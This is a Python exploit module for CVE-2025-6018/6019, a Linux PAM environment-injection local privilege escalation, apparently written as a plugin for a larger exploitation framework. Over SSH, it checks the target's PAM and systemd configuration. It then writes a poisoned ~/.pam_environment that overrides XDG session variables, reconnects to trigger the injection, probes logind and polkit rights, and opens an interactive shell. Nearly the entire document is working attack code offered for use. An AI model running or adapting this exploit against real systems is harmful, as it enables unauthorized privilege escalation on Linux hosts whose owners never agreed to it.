# Exploit Title: Linux PAM Environment - Variable Injection Local Privilege Escalation
# Exploit Author: @İbrahimsql
# Exploit Author's github: https://github.com/ibrahmsql
# Description: PAM pam_env.so module allows environment variable injection via ~/.pam_environment
#              leading to privilege escalation through SystemD session manipulation
# CVE: CVE-2025-6018, CVE-2025-6019
# Vendor Homepage: https://github.com/linux-pam/linux-pam
# Software Link: https://github.com/linux-pam/linux-pam/releases
# Version: PAM 1.3.0 - 1.6.0 (vulnerable versions)
# Category: Local Privilege Escalation
# Requirements: paramiko>=2.12.0
# Usage: python3 cve_2025_6018_professional.py -i target_ip -u username -p password
# References: 
#   - https://access.redhat.com/security/cve/CVE-2025-6018
#   - https://bugzilla.redhat.com/show_bug.cgi?id=2372693
#   - https://bugzilla.suse.com/show_bug.cgi?id=1243226

from pathlib import Path
import paramiko
import time
import socket
import logging

from core.context import Context
from .cve_2025_6018_parser import CVE20256018Parser
from core.commands.run import tcve_exploit

# Setup logging
# logging.basicConfig(
#     level=logging.INFO,
#     format='%(asctime)s [%(levelname)s] %(message)s',
#     datefmt='%Y-%m-%d %H:%M:%S',
#     handlers=[
#         logging.FileHandler('cve_2025_6018_exploit.log'),
#         logging.StreamHandler(sys.stdout)
#     ]
# )
logger = logging.getLogger(__name__)

class CVEExploit:
    def __init__(self):
        self.vulnerable_versions = [
            "pam-1.3.0", "pam-1.3.1", "pam-1.4.0", "pam-1.5.0", 
            "pam-1.5.1", "pam-1.5.2", "pam-1.5.3", "pam-1.6.0"
        ]
        
    def check_vulnerability(self, client: paramiko.SSHClient):
        """Enhanced vulnerability detection"""
        logger.info("Starting vulnerability assessment")
        
        checks = {
            "pam_version": "rpm -q pam || dpkg -l | grep libpam",
            "pam_env": "find /etc/pam.d/ -name '*' -exec grep -l 'pam_env' {} \\; 2>/dev/null",
            "pam_systemd": "find /etc/pam.d/ -name '*' -exec grep -l 'pam_systemd' {} \\; 2>/dev/null",
            "systemd_version": "systemctl --version | head -1"
        }

        vulnerable = False
        
        for check_name, command in checks.items():
            logger.info(f"Executing check: {check_name}")
            try:
                _stdin, stdout, _stderr = client.exec_command(command, timeout=10)
                output = stdout.read().decode().strip()
                
                if check_name == "pam_version":
                    for vuln_ver in self.vulnerable_versions:
                        if vuln_ver in output:
                            logger.info(f"Vulnerable PAM version detected: {vuln_ver}")
                            vulnerable = True
                            break
                            
                elif check_name == "pam_env" and output:
                    logger.info("pam_env.so configuration found")
                    vulnerable = True
                    
                elif check_name == "pam_systemd" and output:
                    logger.info("pam_systemd.so found - escalation vector available")
                    
                if output and check_name != "pam_version":
                    logger.debug(f"Command output: {output[:100]}...")
                    
            except Exception as e:
                logger.warning(f"Check {check_name} failed: {e}")
            
            time.sleep(0.5)

        return vulnerable

    def create_malicious_environment(self, client: paramiko.SSHClient):
        """Create enhanced .pam_environment file"""
        logger.info("Creating malicious environment file")
        
        payload = '''# CVE-2025-6018 Environment Poisoning
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user
XDG_RUNTIME_DIR OVERRIDE=/tmp/runtime
SYSTEMD_LOG_LEVEL OVERRIDE=debug'''

        try:
            logger.info("Writing .pam_environment file")
            cmd = f"cat > ~/.pam_environment << 'EOF'\n{payload}\nEOF"
            _stdin, stdout, _stderr = client.exec_command(cmd)
            
            # Verify creation
            _stdin, stdout, _stderr = client.exec_command("cat ~/.pam_environment")
            output = stdout.read().decode()
            
            if "OVERRIDE" in output:
                logger.info("Malicious environment file created successfully")
                return True
            else:
                logger.error("Failed to create environment file")
                return False
                
        except Exception as e:
            logger.error(f"Environment poisoning failed: {e}")
            return False

    def test_privilege_escalation(self, client: paramiko.SSHClient):
        """Test privilege escalation vectors"""
        logger.info("Testing privilege escalation vectors")
        
        tests = [
            ("SystemD Reboot", "gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot", "yes"),
            ("SystemD Shutdown", "gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanPowerOff", "yes"),
            ("PolicyKit Check", "pkcheck --action-id org.freedesktop.policykit.exec --process $$ 2>/dev/null || echo 'denied'", "authorized")
        ]
        
        escalated = False
        
        for test_name, command, success_indicator in tests:
            logger.info(f"Testing: {test_name}")
            try:
                _stdin, stdout, _stderr = client.exec_command(command, timeout=10)
                output = stdout.read().decode().strip()
                
                if success_indicator in output.lower():
                    logger.info(f"PRIVILEGE ESCALATION DETECTED: {test_name}")
                    escalated = True
                else:
                    logger.info(f"No escalation detected: {test_name}")
                    
            except Exception as e:
                logger.warning(f"Test {test_name} failed: {e}")
        
        return escalated

    def interactive_shell(self, client: paramiko.SSHClient):
        """Professional interactive shell"""
        logger.info("Starting interactive shell session")

        shell = client.invoke_shell()
        shell.send("export PS1='exploit$ '\n".encode())
        time.sleep(1)
        
        # Clear buffer
        while shell.recv_ready():
            shell.recv(1024)

        print("\n--- Interactive Shell ---")
        print("Commands: 'exit' to quit, 'status' for privilege check")
        
        while True:
            try:
                command = input("exploit$ ")
                
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'status':
                    _stdin, stdout, _stderr = client.exec_command("id && groups")
                    print(stdout.read().decode())
                    continue

                shell.send((command + "\n").encode())
                time.sleep(0.5)
                
                while shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8', errors='ignore')
                    print(output, end='')
                    
            except KeyboardInterrupt:
                logger.warning("Use 'exit' to quit properly")
            except Exception as e:
                logger.error(f"Shell error: {e}")
                break

    def run_exploit(self, hostname: str, username:str, password:str|None=None, key_filename:str|None=None, key_passphrase:str|None=None, port:int=22):
        """Main exploit execution"""
        logger.info(f"Starting CVE-2025-6018 exploit against {hostname}:{port}")
        client: paramiko.SSHClient|None = None
        try:
            # Initial connection
            client = paramiko.SSHClient()
            # trunk-ignore(bandit/B507)
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            logger.info(f"Connecting to {hostname}:{port} as {username}")
            client.connect(hostname, port=port, username=username, passphrase=key_passphrase,
                           password=password, key_filename=key_filename, timeout=10)
            logger.info("SSH connection established")

            # Check vulnerability
            if not self.check_vulnerability(client):
                logger.error("Target does not appear vulnerable to CVE-2025-6018/6019")
                return False

            logger.info("Target appears vulnerable, proceeding with exploitation")

            # Create malicious environment
            if not self.create_malicious_environment(client):
                logger.error("Failed to create malicious environment")
                return False

            logger.info("Reconnecting to trigger PAM environment loading")
            client.close()
            time.sleep(2)

            # Reconnect to trigger PAM
            client = paramiko.SSHClient()
            # trunk-ignore(bandit/B507)
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, port=port, username=username, passphrase=key_passphrase,
                           password=password, key_filename=key_filename)
            logger.info("Reconnection successful")

            # Test privilege escalation
            if self.test_privilege_escalation(client):
                logger.info("EXPLOITATION SUCCESSFUL - Privilege escalation confirmed")
                self.interactive_shell(client)
            else:
                logger.warning("No clear privilege escalation detected")
                logger.info("Manual verification may be required")

            return True

        except paramiko.AuthenticationException:
            logger.error("Authentication failed - check credentials")
        except paramiko.SSHException as e:
            logger.error(f"SSH error: {e}")
        except socket.error as e:
            logger.error(f"Network error: {e}")
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
        finally:
            try:
                if client:
                    client.close()
            except Exception:
                pass
            logger.info("Connection closed")

        return False

@tcve_exploit("cve_2025_6018", parser=CVE20256018Parser, categories=["ssh", "local_privilege_escalation", "libpam", "linux"])
def main(context: Context, password: str|None, key_filename: str|None, key_passphrase: str|None, hostname: str, username: str, port: int):
    if not password and not key_filename:
        raise ValueError("Provide either password (-p) or private key (-k)")

    # Security warning
    logger.warning("Use only with proper authorization!")
    
    exploit = CVEExploit()
    success = exploit.run_exploit(
        hostname=hostname,
        username=username,
        password=password,
        key_passphrase=key_passphrase,
        key_filename=str(Path(key_filename).absolute()) if key_filename else None,
        port=port
    )
    if success:
        logger.info("Exploit completed successfully")
    else:
        logger.error("Exploit failed or target not vulnerable")